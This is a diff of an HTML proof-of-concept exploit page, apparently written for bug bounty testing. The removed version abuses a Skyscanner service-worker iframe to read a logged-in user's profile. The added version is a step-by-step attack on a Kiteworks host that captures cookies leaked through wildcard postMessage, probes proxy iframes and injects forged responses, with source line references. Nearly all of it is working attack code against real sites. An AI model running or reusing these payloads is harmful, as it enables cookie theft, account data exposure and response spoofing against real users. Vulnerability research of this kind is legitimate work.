@@ -1,23 +1,152 @@
-<iframe id="bridge" src="https://www.skyscanner.fr/g/tagging/_/service_worker/63b0/sw_iframe.html?origin=https://poc1337.xyz"></iframe>
-<script>
-  window.addEventListener("message", function(e) {
-    // Receives credentialed response from skyscanner.fr
-    console.log("Stolen data:", e.data);
-    document.getElementById("exfil").textContent = JSON.stringify(e.data);
-  });
 
-  setTimeout(function() {
-    document.getElementById("bridge").contentWindow.postMessage({
-      type: 1,
-      command: {
-        commandType: 0,
-        params: {
-          url: "https://www.skyscanner.fr/sttc/api/user/profile",
-          processResponse: true,
-          method: 0
+<!DOCTYPE html>
+<html>
+<head>
+<title>VULN-02 PoC - xdomain postMessage cookie leak</title>
+</head>
+<body>
+<h3>VULN-02: xdomain postMessage("*") Cookie Leak</h3>
+<p>Host this on <b>poc1337.xyz</b>. Target: bc-private-kw.bounty.kiteworks.dev</p>
+
+<button onclick="startListener()">1. Start Listener</button>
+<button onclick="openTarget()">2. Open Target</button>
+<button onclick="probeSlaves()">3. Probe Slave Iframes</button>
+<button onclick="injectMessage()">4. Inject into Target</button>
+<br><br>
+<pre id="log"></pre>
+
+<div id="frames" style="display:none"></div>
+
+<script>
+var TARGET = "https://bc-private-kw.bounty.kiteworks.dev";
+var targetWin = null;
+var socketIds = [];
+
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+}
+
+// Step 1 - listen for any postMessage from target (wildcard origin)
+function startListener() {
+  window.addEventListener("message", function(e) {
+    log("[MSG] origin=" + e.origin);
+    var d = typeof e.data === "string" ? e.data : JSON.stringify(e.data);
+    log("[MSG] data=" + d.substring(0, 500));
+
+    // catch XDPING from slave -> parent with "*"
+    if (typeof e.data === "string" && /^XDPING/.test(e.data)) {
+      log("[HIT] Intercepted XDPING slave handshake via wildcard origin!");
+    }
+
+    // catch xdomain socket messages, extract socket id
+    try {
+      var parsed = typeof e.data === "string" ? JSON.parse(e.data) : e.data;
+      if (Array.isArray(parsed) && /^xdomain-/.test(parsed[0])) {
+        socketIds.push(parsed[0]);
+        log("[HIT] Socket ID captured: " + parsed[0]);
+        if (parsed[1] === "request" && parsed[2] && parsed[2].credentials) {
+          log("[CRITICAL] COOKIE LEAKED: " + parsed[2].credentials);
         }
       }
-    }, "https://www.skyscanner.fr");
-  }, 3000); // Wait for SW registration
+    } catch(_) {}
+  });
+  log("[+] Listener active on " + location.origin);
+}
+
+// Step 2 - open target admin (xdomain master runs here)
+function openTarget() {
+  targetWin = window.open(TARGET + "/admin/");
+  if (!targetWin) { log("[-] Popup blocked, allow popups"); return; }
+  log("[+] Target opened");
+}
+
+// Step 3 - iframe slave endpoints; slave sends parent.postMessage("XDPING_V1","*")
+function probeSlaves() {
+  var paths = ["/proxy.html", "/xdomain/proxy.html", "/scripts/vendors/xdomain/dist/0.6/proxy.html"];
+  var container = document.getElementById("frames");
+  paths.forEach(function(p) {
+    var f = document.createElement("iframe");
+    f.src = TARGET + p;
+    f.style.cssText = "width:1px;height:1px";
+    container.appendChild(f);
+    log("[*] Probing " + p);
+  });
+  log("[*] If slave loads, we receive XDPING as parent (wildcard origin)");
+}
+
+// Step 4 - inject crafted xdomain message into target (VULN-03: no origin check)
+function injectMessage() {
+  if (!targetWin || targetWin.closed) { log("[-] Open target first"); return; }
+
+  // use captured socket id or random one
+  var id = socketIds.length > 0
+    ? socketIds[socketIds.length - 1]
+    : "xdomain-" + Math.round(Math.random() * 0xFFFFFFFF).toString(16);
+
+  // inject fake XHR response - target processes without checking e.origin
+  var payload = JSON.stringify([id, "response", {
+    status: 200,
+    statusText: "OK",
+    data: "INJECTED_BY_ATTACKER_poc1337xyz",
+    headers: {"content-type": "text/html"},
+    text: "injected"
+  }]);
+
+  targetWin.postMessage(payload, "*");
+  log("[+] Injected into socket " + id);
+  log("[+] Target startPostMessage handler has no e.origin check (line 883)");
+}
 </script>
-<pre id="exfil"></pre>
+
+<!--
+VULNERABILITY REFERENCE:
+  File: scripts/vendors/xdomain/dist/0.6/xdomain.patch.js (v0.6.14)
+
+  Source (line 692):  obj.credentials = document.cookie;
+  Sink   (line 951):  frame.postMessage(args, "*");
+  No origin check on listener (line 883-922): e.origin never validated
+
+  Additional wildcard senders:
+    line 862: window.parent.postMessage("XDPING_V1", "*")
+    line 972: frame.postMessage([id, "XD_CHECK", {}], "*")
+-->
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+</body>
+</html>
